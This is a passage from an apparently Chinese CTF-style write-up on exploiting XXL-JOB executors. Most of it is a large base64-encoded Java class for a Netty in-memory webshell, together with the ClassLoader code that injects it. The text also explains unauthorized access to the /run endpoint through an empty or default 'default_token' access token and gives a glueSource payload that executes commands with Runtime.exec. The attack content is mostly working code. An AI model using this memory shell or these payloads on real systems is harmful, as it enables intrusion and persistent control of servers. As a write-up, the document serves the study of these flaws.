ZQbHNobTV0NmUrWUtTbUViMURWejE1NFphdER5KzE1dk1KK0tMY1FkZmFZNDBIQWFZbGE3ZDdTS3pzRm02L1h5ckh2MEhOSnF6T1hURHF6VGphZE1yT0dKZzhzb2EwK3dKbEV6VmZDbWNLN1oyQ2c3L0RHd3h1WE1uZTZpTFI4bTdUN3BGVTYyTy9lZUE1elpPdTNkQ3VYMVlUelIwbnZQa0g5RXNiY1FreHk3Wks5UHRralJGNjNvTWNta0JuWE0zRzMxeWFqYnAvMHFNNTk5ZnpPZmRCTXAxSkpJNjVKSHhVZlM2VVRSdHhSdktCNzBSSHFlbTM5b3VPSTdKZCt2endrQTRKY2FNbjYvVUUxc3loL0ozZ08rR1czREFscXIwZDJvU3NOVjhoQk5GSkQ3cnhRTnpDUnBtOC93dXlwOG1ra25lVFUyWHlYcTQyZFR0OHY3MlRLeWFwUnQvZjZ2ZjNDd2ZGR003Z2NFWjB6c1l6Y1lNeTVocVNhSmpvQ0M4WHl0dDZlZ1k2ZWdjUFJqcDRIQi9ad2lJek9uUTVic3JGRVlxWnBrMUVaODRraDQwb0RuQ1NYcWJxaVdqdzNaeDFUczlFand0UXllQU4zK2VHdmFxcXJwdFRjNjR3RWdqV2h4YWRzb2p3cUdjN1ZraTEwK0hsUW1qQUxMVHZKaEdtd3RIY21jMW1PVEEwLzBEamZtYk55R1lQc1RzcXBDamtoRTlmNW11REFSaE5aZW8rcU5Sekh5dHFpdmYzTUdvdVBQbk9SeU9nSmVkSW5qd3Nuc3p1dWo2UEpVeXhtZWp3K2d5ellINXBuNWxqS2RGdUl5SU1LSkJHYngyOEpOMytQdkxkQ25wYjN6UXk0Uk9pajM4eE1TUEtzYWkraU0wZUYwNU1iaisvM3kybDVqaTFXMmtIVFk4Y0dNcm9xdnF1djRSV1F0QXZiQitWRGZrNEl6NnVCaGtOSldTeVp5aG9CK1FqdVVkVE8wSzRNVTFYRUxiZWg4L1VueGt4ZHljeXkyV2FQUGN0c1h0MTZlc0Q1a09xZi9kWkdyd2wwOFpZWnV6VXh1QXp1ejVsVzRyaHhJR0UzOEMybW1XS3lVYUJZeDNuR0F6WE0rbFZOaDhoWnJrcXduT3NWQmV0VlhGY1dyRy9pK3VhQzlhMWNyeTVZMzBibzI3SEdmbCtMTy9qMHE2bWI1eCt6OTlhUm82alBsZHo1T0hmV29KUnJZR1Y0Q3ZlRkwrUCs0U21FWGtiNEpYdWFZcFpBTGRzTlFzcG5VVTVKSVEvVnZvWk41OUFZcm4wVm0xNUdRL2pMYUxpRWJZS2V1a2swNWJHN3lSUDB2STdsUWM4a1d2UFljeDZCbXRwTDZDbkIwRXRFN1RzbnE0aloxek9McCtCZHpMSmdtY0lzVzRoWmR3bk0vNU00bU1lUnBuTGlob1BsZWNTSDZsN0Q2RGxNcVkxSmpPZVI5QnpKSTEyWm1jYXBKazN0bHVieGVEaW9UZVBkZkh0dmszY1N6N3lCVzhKQmJ4N1BmUW5QaEdzcVB6aUZGMTdFRVI3azhja20zMldjcHc0KzFlUVArb0wrUEg1eWlFK3Y4OHpqcDRmQ05hNlNKdkd6cFN0WDV2SHpGQ09zSUQvdklZTnB2TVExejlUUkpGL3orSkpOdjZwSkMyckVwaXhUbU9MV1M3TjNvNXJQc3ZWcFJEMk44Z21xZlRmODM4Y21EVHMwdEw4Tjd4WFVhK2h6bGx6b2ZOaC9aOTdHSTYwYTZsZmdLalNVYWlqUnNGZmpUQVg1SktsNFNIY0QveitMMHlpMVRmZzh3WlFKOTBtMzlOeUVTNDBlYVNxdi9PbzBYbFhDVlg0amo5ZWJ2RUV2Ny9ITFFhL2s4V3ZkbFdjcmY2UDBhemlieCsrRTgvZ0RlUlYvbE1kM2V3cTJLeSs0bTAyK1drSlUvcVdIKzhPbGxkL3E1eUdWNksvbHhnVnVuSzM4YTlMbjduZGZ4WnQ1L0VPang0Yi9wM0lIL2tML01MM2dYL3VIeS9pcVVNdUQ1YlhsTnFyaXpOTmJQTlA0VDU0SGZZckkwSXNvYTlJdTQ2MWhDdkkvMDdpU2w1SXA0VmFWOE0vblVqMmpxRXFBV09vM0x5dWMrOG5Lb0Rlb09kUnJDRkk2TFZXRXFYbEZQVzBKenpiNWd1V3ZZOTFpUXRUWk1nUjlGNm5nQUw2Sk4yYU5WNDNTcTF5VzIrWTRRM1B3ejZOeDFoQ2FTcTdnU1ExdmNhblI1ck5XY29Oem11OVA0V2tuNERER2dGTXBJbHdsTjAvTDdUMTFhODVCODd3SVQ5bGxXVHM4S1hmbTVXNGVUY2w5ZWFtdXE4bEwzVVVWc3JZUU5TaTVpcFh3T0VLSUpyZEMvVnhWREF2MlN2Z2pCYzdpVXg5dlhQYlBrWDBwbjBlckpFSVBxWktOcnNXRnp3dThmYlNHS3FtU3paNFpWZk9zeGpGMjJGRmkrOFZvbFd3aE1nT3J1OWFHYml5RXJwMEhiV2VpWnV4UWJtdGZveHp5dUViMUZFcjRCSjUwSlh6QmxUQTlJK0gyNGhJMnVUemJGMHA0aG45S3lCMXpoTnhWaUZDN0VNR1djeGNlS0pUelhYUGxMRkdmRmwwNWo3aUdITGdzdTJtM3prbUoxazVLNzdRTVRzbkRQWFdYNUJETG9MeWpTZzduSlRia3JDY2x3WmVqZ3J3Y3AxUG1KVDFVYzBuWUVuTDNzUklldi91U1BHTW5EOHdKOXhMMXNjek43VTlSTytWOGJwVnVONm4xWEpiVHczVlQ4b0h1bXRxOGZMZ3VMeTgwZVdwZmg4YlZSNE9laTAxbHM0dXlyNU5XQ1N0SXRlM1ROZlp6MXNPdllMMG1weldjWnlLNlNqQW4rZFJ6ejNieks3UVRjMDA5RlhET0xrSHN3YmpsWCsrVDg0NjZVQWI4UDVYVk1LQ0NIUUFBCAAeAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL1Rocm93YWJsZQcAIgwAIAAhCgAFACQMABIAEwkAAgAmAQAGaW5qZWN0DAAoACEKAAIAKQEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyBwArCgAsACQMABAAEQkAAgAuAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7DAAwADEKACwAMgEAC1svKl0gcmVhZHkKCAA0AQAIdG9TdHJpbmcMADYAGAoALAA3AQAHZmFpbGVkIAgAOQEAD2dldEVycm9yTWVzc2FnZQEAKShMamF2YS9sYW5nL1Rocm93YWJsZTspTGphdmEvbGFuZy9TdHJpbmc7DAA7ADwKAAIAPQEAAQoIAD8BABBqYXZhL2xhbmcvU3lzdGVtBwBBAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07DABDAEQJAEIARQEAC2luaXRDaGFubmVsAQAqKExpby9uZXR0eS9jaGFubmVsL3NvY2tldC9Tb2NrZXRDaGFubmVsOylWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcASQwAFAAVCQACAEsBAA9qYXZhL2xhbmcvQ2xhc3MHAE0BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DABPAFAKAE4AUQEAH2lvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXIHAFMBACVpby9uZXR0eS9jaGFubmVsL3NvY2tldC9Tb2NrZXRDaGFubmVsBwBVAQAIcGlwZWxpbmUBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsMAFcAWAsAVgBZAQApaW8vbmV0dHkvaGFuZGxlci90aW1lb3V0L0lkbGVTdGF0ZUhhbmRsZXIHAFsFAAAAAAAAAFoBAB1qYXZhL3V0aWwvY29uY3VycmVudC9UaW1lVW5pdAcAXwEAB1NFQ09ORFMBAB9MamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7DABhAGIJAGAAYwEAJShKSkpMamF2YS91dGlsL2NvbmN1cnJlbnQvVGltZVVuaXQ7KVYMACAAZQoAXABmAQAgaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsUGlwZWxpbmUHAGgBAAdhZGRMYXN0AQBGKFtMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwwAagBrCwBpAGwBACtpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFNlcnZlckNvZGVjBwBuCgBvACQBADBpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cE9iamVjdEFnZ3JlZ2F0b3IHAHEDAFAAAAEABChJKVYMACAAdAoAcgB1AQApY29tL3h4bC9qb2IvY29yZS9iaXovaW1wbC9FeGVjdXRvckJpekltcGwHAHcKAHgAJAEAAAgAegEAJ2phdmEvdXRpbC9jb25jdXJyZW50L1RocmVhZFBvb2xFeGVjdXRvcgcAfAUAAAAAAAAAPAEAKGphdmEvdXRpbC9jb25jdXJyZW50L0xpbmtlZEJsb2NraW5nUXVldWUHAIAKAIEAdQEAKChMamF2YS9sYW5nL1J1bm5hYmxlOylMamF2YS9sYW5nL1RocmVhZDsQAIMBABRsYW1iZGEkaW5pdENoYW5uZWwkMAwAhQCDCgACAIYPBgCHAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQcAiQEAC21ldGFmYWN0b3J5AQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7DACLAIwKAIoAjQ8GAI4BAAluZXdUaHJlYWQBACYoKUxqYXZhL3V0aWwvY29uY3VycmVudC9UaHJlYWRGYWN0b3J5OwwAkACREgAAAJIBAEAoTGphdmEvbGFuZy9SdW5uYWJsZTtMamF2YS91dGlsL2NvbmN1cnJlbnQvVGhyZWFkUG9vbEV4ZWN1dG9yOylWEACUAQAUbGFtYmRhJGluaXRDaGFubmVsJDEMAJYAlAoAAgCXDwYAmAEAEXJlamVjdGVkRXhlY3V0aW9uAQAxKClMamF2YS91dGlsL2NvbmN1cnJlbnQvUmVqZWN0ZWRFeGVjdXRpb25IYW5kbGVyOwwAmgCbEgABAJwBAJwoSUlKTGphdmEvdXRpbC9jb25jdXJyZW50L1RpbWVVbml0O0xqYXZhL3V0aWwvY29uY3VycmVudC9CbG9ja2luZ1F1ZXVlO0xqYXZhL3V0aWwvY29uY3VycmVudC9UaHJlYWRGYWN0b3J5O0xqYXZhL3V0aWwvY29uY3VycmVudC9SZWplY3RlZEV4ZWN1dGlvbkhhbmRsZXI7KVYMACAAngoAfQCfAQBgKExjb20veHhsL2pvYi9jb3JlL2Jpei9FeGVjdXRvckJpejtMamF2YS9sYW5nL1N0cmluZztMamF2YS91dGlsL2NvbmN1cnJlbnQvVGhyZWFkUG9vbEV4ZWN1dG9yOylWDAAgAKEKAAcAogEADWdldFNoZWxsQ2xhc3MBACUoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvQ2xhc3M7AQAoKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL0NsYXNzPCo+OwEAEGphdmEvbGFuZy9PYmplY3QHAKcBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMAKkAqgoAqACrAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACtAK4KAE4ArwwAFwAYCgACALEBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHALMBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAC1ALYKALQAtwwAGwAYCgACALkBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAC7ALwKAAIAvQEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDAC/AMAKAAIAwQEAC2RlZmluZUNsYXNzCADDAQACW0IHAMUBABFqYXZhL2xhbmcvSW50ZWdlcgcAxwEABFRZUEUMAMkAFQkAyADKAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DADMAM0KAE4AzgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcA0AEADXNldEFjY2Vzc2libGUBAAQoWilWDADSANMKANEA1AEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DADWANcKAMgA2AEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwA2gDbCgDRANwBABBqYXZhL2xhbmcvVGhyZWFkBwDeAQARZ2V0QWxsU3RhY2tUcmFjZXMBABEoKUxqYXZhL3V0aWwvTWFwOwwA4ADhCgDfAOIBAA1qYXZhL3V0aWwvTWFwBwDkAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMAOYA5wsA5QDoAQANamF2YS91dGlsL1NldAcA6gEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwA7ADtCwDrAO4BABJqYXZhL3V0aWwvSXRlcmF0b3IHAPABAAdoYXNOZXh0AQADKClaDADyAPMLAPEA9AEABG5leHQMAPYAUAsA8QD3AQAHZ2V0TmFtZQwA+QAYCgDfAPoBABFuaW9FdmVudExvb3BHcm91cAgA/AEAEGphdmEvbGFuZy9TdHJpbmcHAP4BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwBAAEBCgD/AQIBAAZ0YXJnZXQIAQQBAA1nZXRGaWVsZFZhbHVlAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAQYBBwoAAgEIAQAIcnVubmFibGUIAQoBABF2YWwkZXZlbnRFeGVjdXRvcggBDAoATgD6AQAMTmlvRXZlbnRMb29wCAEPAQAIZW5kc1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoMAREBEgoA/wETAQARdW53cmFwcGVkU2VsZWN0b3IIARUBAARrZXlzCAEXAQARamF2YS91dGlsL0hhc2hTZXQHARkBAAdpc0VtcHR5DAEbAPMKARoBHAEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsMAR4BHwoBGgEgAQAKYXR0YWNobWVudAgBIggAVwEABGhlYWQIASUIAPYBAAdoYW5kbGVyCAEoDACkAKUKAAIBKgEADGNoaWxkSGFuZGxlcggBLAEADXNldEZpZWxkVmFsdWUBADkoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYMAS4BLwoAAgEwAQAQamF2YS51dGlsLkJhc2U2NAgBMgEAB2Zvck5hbWUMATQAtgoATgE1AQAKZ2V0RGVjb2RlcggBNwEACWdldE1ldGhvZAwBOQDNCgBOAToBAAZkZWNvZGUIATwBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAE+AQAMZGVjb2RlQnVmZmVyCAFAAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAUIKAUMAJAEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwFFAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBRwEABShbQilWDAAgAUkKAUgBSgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgwAIAFMCgFGAU0BAARyZWFkAQAFKFtCKUkMAU8BUAoBRgFRAQAFd3JpdGUBAAcoW0JJSSlWDAFTAVQKAUMBVQEABWNsb3NlDAFXACEKAUYBWAoBQwFYAQALdG9CeXRlQXJyYXkBAAQoKVtCDAFbAVwKAUMBXQEACGdldEZpZWxkAQA+KExqYXZhL2xhbmcvQ2xhc3M7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAEEoTGphdmEvbGFuZy9DbGFzczwqPjtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcBYgEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAWQBZQoATgFmAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAWgKAWkA1AEADWdldFN1cGVyY2xhc3MMAWsAqgoATgFsDAFfAWAKAAIBbgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAFwAXEKAWkBcgEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwBdAF1CgFpAXYBABNqYXZhL2lvL1ByaW50U3RyZWFtBwF4AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgwAIAF6CgF5AXsBAA9wcmludFN0YWNrVHJhY2UBABgoTGphdmEvaW8vUHJpbnRTdHJlYW07KVYMAX0BfgoAIwF/CgFDADcKAXkBWAEAHShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsOylWDABHAEgKAAIBhAEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uBwGGAQAweHhsLWpvYiwgRW1iZWRTZXJ2ZXIgYml6VGhyZWFkUG9vbCBpcyBFWEhBVVNURUQhCAGIAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAgAYoKAYcBiwEAI3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&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;org.apache.http.web.handlers.jxXZQ.CheckerNettyHandler&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(className);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Definder</span>().defineClass(Base64.getDecoder().decode(base64Str)).newInstance();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable ee) &#123;</span><br><span class="line">                ee.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">  	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Definder</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Definder</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(Thread.currentThread().getContextClassLoader());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; defineClass(<span class="type">byte</span>[] bytes) &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223100425-7p8852a.png" alt="image"></p>
<p>‍</p>
<h5 id="执行器-run-未授权注入Netty内存马-Code-Audit"><a href="#执行器-run-未授权注入Netty内存马-Code-Audit" class="headerlink" title="执行器 &#x2F;run 未授权注入Netty内存马 &amp; Code Audit"></a>执行器 &#x2F;run 未授权注入Netty内存马 &amp; Code Audit</h5><p>漏洞产生逻辑在<code>com.xxl.job.core.server.EmbedServer</code>中</p>
<p>在执行器<code>Executor</code>端启动一个<code>Netty HTTP</code>服务端，供调度中心远程调用执行器执行任务，漏洞代码逻辑如下图</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223102945-by127jn.png" alt="image"></p>
<p>若配置文件中未配置<code>accessToken</code>，会导致<code>acessToken == null</code>，从而无需<code>accessToken</code>即可未授权访问下面所有接口，包括<code>/run, /idleBeat, /kill</code>等等</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223101632-d4hn8pj.png" alt="image"></p>
<p>‍</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223103449-tkwn2y3.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223103603-31fg50u.png" alt="image"></p>
<h3 id="Challenge-04"><a href="#Challenge-04" class="headerlink" title="Challenge 04"></a>Challenge 04</h3><h4 id="执行器内存马注入-2"><a href="#执行器内存马注入-2" class="headerlink" title="执行器内存马注入"></a>执行器内存马注入</h4><p>自<code>xxl-job 2.3.1</code>开始，修复了之前默认<code>accessToken</code>为空的问题，并引入了默认<code>token</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223111208-2bydwek.png" alt="image"></p>
<p>这里配置文件默认<code>accessToken = default_token</code>，加一个请求头<code>XXL-JOB-ACCESS-TOKEN: default_token</code>即可</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251223110449-hnbkd6t.png" alt="image"></p>
<p>‍</p>
<h5 id="正常命令执行回显到日志"><a href="#正常命令执行回显到日志" class="headerlink" title="正常命令执行回显到日志"></a>正常命令执行回显到日志</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;glueSource&quot;</span>: <span class="string">&quot;import com.xxl.job.core.handler.IJobHandler;\nimport com.xxl.job.core.context.XxlJobHelper;\n\npublic class DemoGlueJobHandler extends IJobHandler &#123;\n\n    @Override\n    public void execute() throws Exception &#123;\n        StringBuilder out = new StringBuilder();\n        \n        Process process = Runtime.getRuntime().exec(new String[]&#123;\&quot;java\&quot;, \&quot;-version\&quot;&#125;);\n        \n        java.io.BufferedReader errorReader = new java.io.BufferedReader(\n            new java.io.InputStreamReader(process.getErrorStream())\n        );\n        \n        String line;\n        while ((line = errorReader.readLine()) != null) &#123;\n            out.append(\&quot;**********\&quot;).append(line).append(\&quot;**********\\n\&quot;);\n        &#125;\n        errorReader.close();\n        \n        int exitCode = process.waitFor();\n        if (exitCode != 0) &#123;\n            java.io.BufferedReader reader = new java.io.BufferedReader(\n                new java.io.InputStreamReader(process.getInputStream())\n            );\n            while ((line = reader.readLine()) != null) &#123;\n                out.append(\&quot;[STDOUT] \&quot;).append(line).append(\&quot;\\n\&quot;);\n            &#125;\n            reader.close();\n        &#125;\n\n        XxlJobHelper.log(out.toString());\n    &#125;\n&#125;&quot;</span>,</span><br></pre></td></tr></table></figure>

<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224173631-o3xaavp.png" alt="image"></p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224173702-8eoqsjb.png" alt="image"></p>
<p>‍</p>
<p>使用的<code>JDK</code>版本为<code>17.0.2</code>​</p>
<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/assets/image-20251224174108-ny4hoz7.png" alt="image"></p>
<p>‍</p>
